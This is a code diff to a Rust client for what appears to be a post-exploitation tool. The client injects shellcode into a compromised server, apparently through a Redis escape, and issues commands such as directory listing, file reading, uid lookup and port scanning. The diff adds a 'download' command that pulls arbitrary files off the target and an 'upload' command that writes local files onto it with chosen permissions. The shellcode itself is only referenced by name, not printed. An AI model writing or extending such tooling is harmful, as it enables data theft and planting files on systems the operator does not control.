@@ -1,9 +1,9 @@
-use std::{io::{self, Write, Read}, error::Error};
+use std::{io::{self, Write, Read}, error::Error, fs::File, path::Path};
 
 use colored::Colorize;
 use errno::Errno;
 
-use crate::{util::{print_failed, print_success, colorized_file, close_connection, print_error}, config::Config, shellcode::{SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SHELLCODE_LEN, REDIS_ESCAPER, OPEN_DIR_SENDER, OPEN_CAT_SENDER, CD_SENDER, PWD_SENDER, TCP_PORT_SCANNER}};
+use crate::{util::{print_failed, print_success, colorized_file, close_connection, print_error, gen_random_filename}, config::Config, shellcode::{SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SHELLCODE_LEN, REDIS_ESCAPER, OPEN_DIR_SENDER, OPEN_CAT_SENDER, CD_SENDER, PWD_SENDER, TCP_PORT_SCANNER, UPLOAD_SENDER}};
 
 fn help() {
     println!(
@@ -103,14 +103,14 @@ fn dir(config: &Config, directory: &str) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
+fn cat(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
     if config.conn.is_none() {
         return Err("Server not connected".into());
     }
-    if file.len() >= 0x10000 {
+    if file_name.len() >= 0x10000 {
         return Err("cat: file name too long".into());
     }
-    let file_name_len: u16 = (file.len() + 1) as u16; // include null byte
+    let file_name_len: u16 = (file_name.len() + 1) as u16; // include null byte
     let cat_sender = OPEN_CAT_SENDER;
     let mut shellcode = cat_sender.shellcode.to_vec();
     shellcode[cat_sender.file_len_index] = (file_name_len & 0xff) as u8;
@@ -119,7 +119,7 @@ fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
 
     let mut conn = config.conn.as_ref().unwrap();
     conn.write(&shellcode)?;
-    conn.write(file.as_bytes())?;
+    conn.write(file_name.as_bytes())?;
     conn.write(&[0])?;
 
     let mut beacon_buff = [0; 8];
@@ -132,7 +132,7 @@ fn cat(config: &Config, file: &str) -> Result<(), Box<dyn Error>> {
         }
         if beacon < 0 {
             let errno = -beacon;
-            let message = format!("cat: cannot access '{}': {}", file, Errno(errno as i32));
+            let message = format!("cat: cannot access '{}': {}", file_name, Errno(errno as i32));
             return Err(message.into());
         }
         let chunk_len = beacon as u64;
@@ -244,6 +244,115 @@ fn getgid(config: &Config) -> Result<(), Box<dyn Error>> {
     let gid = i64::from_le_bytes(gid_buff);
 
     println!("{}", gid);
+
+    Ok(())
+}
+
+fn download(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    if file_name.len() >= 0x10000 {
+        return Err("download: file name too long".into());
+    }
+    let file_name_len: u16 = (file_name.len() + 1) as u16; // include null byte
+    let download_sender = OPEN_CAT_SENDER; // use cat sender because the shellcode is the same
+    let mut shellcode = download_sender.shellcode.to_vec();
+    shellcode[download_sender.file_len_index] = (file_name_len & 0xff) as u8;
+    shellcode[download_sender.file_len_index + 1] = ((file_name_len & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&shellcode)?;
+    conn.write(file_name.as_bytes())?;
+    conn.write(&[0])?;
+
+    let mut beacon_buff = [0; 8];
+    let mut file_content_buff = Vec::new();
+    loop {
+        conn.read_exact(&mut beacon_buff)?;
+        let beacon = i64::from_le_bytes(beacon_buff);
+        if beacon == 0 {
+            break;
+        }
+        if beacon < 0 {
+            let errno = -beacon;
+            let message = format!("download: cannot access '{}': {}", file_name, Errno(errno as i32));
+            return Err(message.into());
+        }
+        let chunk_len = beacon as u64;
+        let mut chunk_buff = vec![0; chunk_len as usize];
+        conn.read_exact(&mut chunk_buff)?;
+        file_content_buff.extend(chunk_buff);
+    }
+
+    let original_file_path = Path::new(file_name);
+    let original_file_name = original_file_path.file_name().unwrap_or_default().to_string_lossy();
+    let stored_file_name = gen_random_filename(&original_file_name);
+    let mut stored_file = File::create(&stored_file_name)?;
+    stored_file.write_all(&file_content_buff)?;
+    let message = format!("Downloaded file stored to '{}'", &stored_file_name);
+    print_success(&message);
+
+    Ok(())
+}
+
+fn upload(config: &Config, file_name: &str, perm: u16) -> Result<(), Box<dyn Error>> {
+    if config.conn.is_none() {
+        return Err("Server not connected".into());
+    }
+    if file_name.len() >= 0x10000 {
+        return Err("upload: file name too long".into());
+    }
+
+    let mut original_file: File;
+    match File::open(file_name) {
+        Ok(f) => {
+            original_file = f;
+        },
+        Err(err) => {
+            let message = format!("upload: cannot access local file '{}': {}", file_name, err);
+            return Err(message.into());
+        }
+    }
+    let original_file_path = Path::new(file_name);
+    let original_file_name = original_file_path.file_name().unwrap_or_default().to_string_lossy();
+    let upload_file_name = gen_random_filename(&original_file_name);
+    let upload_file_name_len: u16 = (upload_file_name.len() + 1) as u16;
+
+    let mut file_content_buff = Vec::new();
+    original_file.read_to_end(&mut file_content_buff)?;
+
+    let upload_sender = UPLOAD_SENDER;
+    let mut shellcode = upload_sender.shellcode.to_vec();
+    shellcode[upload_sender.file_len_index] = (upload_file_name_len & 0xff) as u8;
+    shellcode[upload_sender.file_len_index + 1] = ((upload_file_name_len & 0xff00) >> 8) as u8;
+    shellcode[upload_sender.perm_index] = (perm & 0xff) as u8;
+    shellcode[upload_sender.perm_index + 1] = ((perm & 0xff00) >> 8) as u8;
+    shellcode.resize(SHELLCODE_LEN, 0);
+
+    let mut conn = config.conn.as_ref().unwrap();
+    conn.write(&shellcode)?;
+    conn.write(upload_file_name.as_bytes())?;
+    conn.write(&[0])?;
+
+    let mut index = 0;
+    let file_content_len = file_content_buff.len();
+    loop {
+        let remain_len = file_content_len - index;
+        let write_size = if remain_len < 0x1000 { remain_len } else { 0x1000 };
+        let write_size_buff = write_size.to_le_bytes();
+        conn.write(&write_size_buff)?;
+        if write_size == 0 {
+            break;
+        }
+        let partial_data = &file_content_buff[index..(index + write_size)];
+        conn.write(&partial_data)?;
+        index += write_size;
+    }
+
+    let message = format!("Upload '{}' to '{}'", file_name, upload_file_name);
+    print_success(&message);
 
     Ok(())
 }
@@ -426,15 +535,13 @@ pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
                         None => ".",
                     };
                     if let Err(err) = dir(config, file) {
-                        let message = format!("Error: {}", err);
-                        print_failed(&message);
+                        print_error(err);
                     }
                 },
                 "cat" | "type" => {
-                    if let Some(f) = iter.next() {
-                        if let Err(err) = cat(config, f) {
-                            let message = format!("Error: {}", err);
-                            print_failed(&message);
+                    if let Some(file_name) = iter.next() {
+                        if let Err(err) = cat(config, file_name) {
+                            print_error(err);
                         }
                     } else {
                         print_failed("Error: cat: no file specified")
@@ -450,6 +557,39 @@ pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
                 "pwd" => {
                     if let Err(err) = pwd(config) {
                         print_error(err);
+                    }
+                },
+                "download" => {
+                    if let Some(file_name) = iter.next() {
+                        if let Err(err) = download(config, file_name) {
+                            print_error(err);
+                        }
+                    } else {
+                        print_failed("Error: download: no file specified")
+                    }
+                },
+                "upload" => {
+                    if let Some(file_name) = iter.next() {
+                        let perm_option = match iter.next() {
+                            Some(perm_str) => {
+                                if let Ok(perm) = u16::from_str_radix(perm_str, 8) {
+                                    Some(perm)
+                                } else {
+                                    None
+                                }
+                            },
+                            None => { Some(0o644) },
+                        };
+                        if let Some(perm) = perm_option {
+                            if let Err(err) = upload(config, file_name, perm) {
+                                print_error(err);
+                            }
+                        } else {
+                            print_failed("Error: upload: invalid permission")
+                        }
+                        
+                    } else {
+                        print_failed("Error: upload: no file specified")
                     }
                 },
                 "getuid" => {
